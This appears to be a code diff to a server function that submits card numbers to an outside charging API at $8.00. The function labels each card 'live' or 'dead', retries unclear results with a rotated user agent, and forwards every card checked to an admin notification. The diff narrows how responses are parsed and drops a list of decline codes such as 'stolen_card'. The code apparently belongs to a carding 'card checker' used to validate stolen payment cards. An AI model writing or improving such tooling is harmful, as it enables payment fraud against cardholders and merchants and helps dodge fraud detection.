@@ -92,110 +92,10 @@ const notifyChargedCard = async (
   }
 };
 
-// Extract single key response message from API
-const extractResponseMessage = (data: Record<string, unknown>): string => {
-  if (data?.message && typeof data.message === 'string') {
-    return data.message;
-  }
-  if (data?.status && typeof data.status === 'string') {
-    return data.status;
-  }
-  if (data?.error && typeof data.error === 'string') {
-    return data.error;
-  }
-  if (data?.result && typeof data.result === 'string') {
-    return data.result;
-  }
-  for (const key of Object.keys(data)) {
-    if (typeof data[key] === 'string' && data[key]) {
-      return data[key] as string;
-    }
-  }
-  return 'No response message';
-};
+// NOTE: Only extracting status, message, and full_response from API
+// All other parsing functions removed for cleaner implementation
 
-// Determine status from API response based on full_response field
-const getStatusFromResponse = (data: Record<string, unknown>): "live" | "dead" | "unknown" => {
-  const rawResponse = JSON.stringify(data).toLowerCase();
-  const message = String(data?.message || '').toLowerCase();
-  const status = String(data?.status || '').toLowerCase();
-  
-  console.log('[STRIPE-CHARGE] Analyzing response - full_response:', data?.full_response, 'status:', status);
-  
-  // Primary logic: full_response = true means CHARGED (live), false means DECLINED (dead)
-  if (typeof data?.full_response === 'boolean') {
-    if (data.full_response === true) {
-      console.log('[STRIPE-CHARGE] full_response=true - CHARGED (LIVE)');
-      return "live";
-    } else {
-      console.log('[STRIPE-CHARGE] full_response=false - DECLINED (DEAD)');
-      return "dead";
-    }
-  }
-  
-  // Fallback: check string versions of full_response
-  const fullResponseStr = String(data?.full_response || '').toLowerCase();
-  if (fullResponseStr === 'true') {
-    console.log('[STRIPE-CHARGE] full_response="true" - CHARGED (LIVE)');
-    return "live";
-  }
-  if (fullResponseStr === 'false') {
-    console.log('[STRIPE-CHARGE] full_response="false" - DECLINED (DEAD)');
-    return "dead";
-  }
-  
-  // Check for success indicators
-  if (
-    status === 'success' ||
-    rawResponse.includes('"success"') ||
-    rawResponse.includes('charged') ||
-    rawResponse.includes('approved') ||
-    rawResponse.includes('successful')
-  ) {
-    console.log('[STRIPE-CHARGE] Detected success status - CHARGED (LIVE)');
-    return "live";
-  }
-  
-  // Check for decline indicators in message/response
-  if (
-    message.includes('card_declined') ||
-    message.includes('declined') ||
-    message.includes('insufficient') ||
-    message.includes('expired') ||
-    message.includes('invalid') ||
-    message.includes('do_not_honor') ||
-    message.includes('lost_card') ||
-    message.includes('stolen_card') ||
-    rawResponse.includes('card_declined') ||
-    rawResponse.includes('declined') ||
-    rawResponse.includes('do_not_honor')
-  ) {
-    console.log('[STRIPE-CHARGE] Detected decline in message - DECLINED (DEAD)');
-    return "dead";
-  }
-  
-  // Check for gateway/API errors (retry scenarios)
-  if (
-    rawResponse.includes('timeout') ||
-    rawResponse.includes('connection') ||
-    rawResponse.includes('network') ||
-    rawResponse.includes('unavailable')
-  ) {
-    console.log('[STRIPE-CHARGE] Detected gateway error - UNKNOWN');
-    return "unknown";
-  }
-  
-  // If status is "error" but has decline indicators, mark as dead
-  if (status === 'error' && (message.includes('card') || message.includes('decline'))) {
-    console.log('[STRIPE-CHARGE] Error with card decline - DECLINED (DEAD)');
-    return "dead";
-  }
-  
-  console.log('[STRIPE-CHARGE] Unrecognized response - marking as UNKNOWN');
-  return "unknown";
-};
-
-// Perform API check with retry logic
+// Perform API check with retry logic - ONLY capture: status, message, full_response
 const performCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown>> => {
   const maxRetries = 3;
   
@@ -223,29 +123,43 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
     const rawText = await response.text();
     console.log(`[STRIPE-CHARGE] Attempt ${attempt} - Raw API response:`, rawText);
 
-    let data: Record<string, unknown>;
+    let rawData: Record<string, unknown>;
     try {
-      data = JSON.parse(rawText);
+      rawData = JSON.parse(rawText);
     } catch {
       console.log(`[STRIPE-CHARGE] Failed to parse JSON, using raw text`);
-      data = { raw: rawText, status: "ERROR", message: rawText || "Failed to parse response" };
+      rawData = { status: "ERROR", message: rawText || "Failed to parse response", full_response: false };
     }
 
-    console.log(`[STRIPE-CHARGE] Attempt ${attempt} - Parsed response:`, JSON.stringify(data));
+    // ONLY extract these 3 fields from API response
+    const apiStatus = rawData?.status as string || 'UNKNOWN';
+    const apiMessage = rawData?.message as string || 'No response';
+    const fullResponse = rawData?.full_response;
 
-    const computedStatus = getStatusFromResponse(data);
+    console.log(`[STRIPE-CHARGE] Captured fields - status: ${apiStatus}, message: ${apiMessage}, full_response: ${fullResponse}`);
+
+    // Determine computed status from full_response field
+    let computedStatus: "live" | "dead" | "unknown" = "unknown";
     
-    // Get the REAL API message directly from response
-    const realApiMessage = data?.message as string || data?.status as string || data?.error as string || 'No response';
+    if (typeof fullResponse === 'boolean') {
+      computedStatus = fullResponse === true ? "live" : "dead";
+    } else if (String(fullResponse).toLowerCase() === 'true') {
+      computedStatus = "live";
+    } else if (String(fullResponse).toLowerCase() === 'false') {
+      computedStatus = "dead";
+    }
     
-    // Build status display
-    const apiStatus = computedStatus === 'live' ? 'CHARGED' : computedStatus === 'dead' ? 'DECLINED' : 'UNKNOWN';
+    console.log(`[STRIPE-CHARGE] Computed status: ${computedStatus}`);
 
-    // Extract screenshot URL if available
-    const screenshotUrl = data?.screenshot || data?.screenshot_url || data?.image || data?.image_url || null;
+    // Build display status
+    const displayStatus = computedStatus === 'live' ? 'CHARGED' : computedStatus === 'dead' ? 'DECLINED' : 'UNKNOWN';
 
-    // Send admin debug notification for ALL checks
-    sendAdminDebugNotification(cc, apiStatus, data);
+    // Send admin debug notification with only captured fields
+    sendAdminDebugNotification(cc, displayStatus, { 
+      status: apiStatus, 
+      message: apiMessage, 
+      full_response: fullResponse 
+    });
 
     // Retry on UNKNOWN
     if (computedStatus === "unknown" && attempt < maxRetries) {
@@ -255,24 +169,26 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
       return performCheck(cc, newUserAgent, attempt + 1);
     }
 
+    // Return ONLY the 3 captured fields + computed values
     return {
       computedStatus,
-      apiStatus,
-      apiMessage: realApiMessage,
+      apiStatus: displayStatus,
+      apiMessage,
       apiTotal: '$8.00',
-      rawResponse: JSON.stringify(data),
-      screenshotUrl,
-      fullResponse: data?.full_response,
       status: computedStatus,
-      message: realApiMessage,
+      message: apiMessage,
+      fullResponse, // Internal/debug only
     };
   } catch (error) {
     console.error(`[STRIPE-CHARGE] Attempt ${attempt} - Fetch error:`, error);
     
+    const errorMessage = error instanceof Error ? error.message : "API request failed";
+    
     // Send error debug to admin
     sendAdminDebugNotification(cc, 'ERROR', { 
-      error: error instanceof Error ? error.message : String(error),
-      attempt 
+      status: 'ERROR',
+      message: errorMessage,
+      full_response: null 
     });
     
     if (attempt < maxRetries) {
@@ -283,11 +199,12 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
     }
     
     return { 
-      apiStatus: "ERROR",
-      apiMessage: error instanceof Error ? error.message : "API request failed",
       computedStatus: "unknown",
+      apiStatus: "ERROR",
+      apiMessage: errorMessage,
       status: "unknown",
-      message: error instanceof Error ? error.message : "API request failed",
+      message: errorMessage,
+      fullResponse: null,
     };
   }
 };
@@ -381,8 +298,8 @@ serve(async (req) => {
         responseMsg,
         "$8.00",
         "Yunchi Stripe Charge",
-        data.rawResponse as string,
-        data.screenshotUrl as string | undefined
+        undefined,
+        undefined
       );
     }
 
